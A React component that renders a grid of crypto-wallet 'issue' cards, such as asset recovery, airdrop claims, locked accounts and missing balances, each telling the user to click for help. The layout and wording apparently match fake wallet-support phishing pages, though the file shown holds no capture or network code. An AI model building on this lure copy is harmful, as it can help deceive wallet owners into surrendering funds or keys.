import React from 'react'
import folderConnection from "../assets/folderConnection.png"
import chartSquare from "../assets/chartSquare.png"
import diagram from "../assets/diagram.png"
import moneyTime from "../assets/moneyTime.png"
import frame from "../assets/frame.png"
import ticketExpired from "../assets/ticketExpired.png"
import threedcube from "../assets/threedcube.png"
import group from "../assets/group.png"
import login from "../assets/login.png"
import airdrop from "../assets/airdrop.png"
import brush from "../assets/brush.png"
import moneyForbidden from "../assets/moneyForbidden.png"
import book from "../assets/book.png"
import moneyChange from "../assets/moneyChange.png"
import truckRemove from "../assets/truckRemove.png"
import wallet from "../assets/wallet.png"
import usdCoin from "../assets/usdCoin.png"
import lock from "../assets/lock.png"
import note2 from "../assets/note2.png"
import arrowSwapHorizontal from "../assets/arrowSwapHorizontal.png"

const selection = [{
  "icon":folderConnection,
  "title":"Connect to Dapps",
  "text":"Click here for error while connecting to Dapps"
},{
  "icon":chartSquare,
  "title":"Assets Recovery",
  "text":"Click here for assets recovery issues"
},{
  "icon":diagram,
  "title":"High Gas Fees",
  "text":"Click here for gas fee related issues."
},{
  "icon":moneyTime,
  "title":"Claim Presale Token",
  "text":"Click here to claim presale token related issues"
},{
  "icon":frame,
  "title":"Slippage Error",
  "text":"Click here for slippage related error during trade."
},{
  "icon":ticketExpired,
  "title":"Transaction Error",
  "text":"Click here for transaction related issues."
},{
  "icon":threedcube,
  "title":"Staking Issues",
  "text":"click here for staking related issues."
},{
  "icon":arrowSwapHorizontal,
  "title":"Swap/Exchange",
  "text":"Click here for swap/exchange related issues."
},{
  "icon":group,
  "title":"Cross Chain Transfer",
  "text":"Click here for gas fee related issues."
},{
  "icon":login,
  "title":"Login Issues",
  "text":"Click here for issues while logging into your wallet."
},{
  "icon":airdrop,
  "title":"Claim Airdrop",
  "text":"Click here for airdrop related issues."
},{
  "icon":brush,
  "title":"NFTS Issues",
  "text":"Click here for NFTs minting transfer related issues."
},{
  "icon":moneyForbidden,
  "title":"Missing/ Irregular Balance",
  "text":"Click here to recover lost missing funds."
},{
  "icon":book,
  "title":"Whitelist Issues",
  "text":"Click here for whitelist related issues."
},{
  "icon":moneyChange,
  "title":"Transaction Delay",
  "text":"Click here for any issues related to transaction delayed."
},{
  "icon":truckRemove,
  "title":"Migration Issues",
  "text":"Click here for migration related issues"
},{
  "icon":wallet,
  "title":"Trading Wallet Issues",
  "text":"Click here if you have problem with your trading wallet."
},{
  "icon":usdCoin,
  "title":"Can’t  Buy Coins/Tokens",
  "text":"To trade crypto your account must be marked as a trusted payment source."
},{
  "icon":lock,
  "title":"Locked Account",
  "text":"Click here for issues related to account lock."
},{
  "icon":note2,
  "title":"Other Issues Not Listed",
  "text":"If you can't find the issue you are experiencing click here"
},]

const Selection = () => {
  return (
    <div className='container p-10 mb-10 m-auto bg-[rgba(48,48,48,0.3)] border border-[rgba(48,48,48,0.9)] rounded-lg'>
      <h3 className='text-center font-semibold text-5xl mb-10 text-[rgba(0,200,32,1)] '>Make Your Selection Below</h3>
      <div className='container grid grid-cols-3 m-auto gap-10'>
          {selection.map((item,index)=>{
            const {icon,title,text} = item;
            return <div className='text-center bg-[rgba(48,48,48,0.3)] hover:bg-[rgba(48,48,48,0.7)] border border-[rgba(48,48,48,0.7)] rounded-3xl py-10 px-5' key={index}>
              <div className='flex place-content-center w-[55px] h-[55px] p-2 mb-5 m-auto rounded-2xl bg-[rgba(0,200,32,1)]'>
                <img src={icon} alt="selection-icon.png" className='w-full' />
              </div>
              <div>
                <h4 className='text-white font-semibold mb-2'>{title}</h4>
                <h6 className='text-gray-500 text-xs max-w-[13rem] m-auto'>{text}</h6>
              </div>
            </div>
          })}
      </div>
    </div>
  )
}

export default Selection
